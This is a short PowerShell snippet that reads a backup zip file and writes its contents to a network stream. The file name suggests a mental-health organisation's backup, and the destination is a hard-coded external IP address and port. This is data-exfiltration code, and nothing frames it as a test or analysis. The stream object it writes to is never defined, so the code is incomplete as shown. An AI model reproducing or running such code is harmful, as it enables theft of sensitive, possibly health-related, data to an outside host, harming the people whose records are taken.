$file = "C:\config\backup\Briut_Hanefesh_backup_2021_04_19_000004_2480000.zip"
$ipAddress = "16.16.184.216"
$port = 6655

Get-Content -Path $file -Raw | 
    ForEach-Object {$data = [System.Text.Encoding]::ASCII.GetBytes($_); $stream.Write($data, 0, $data.Length)}
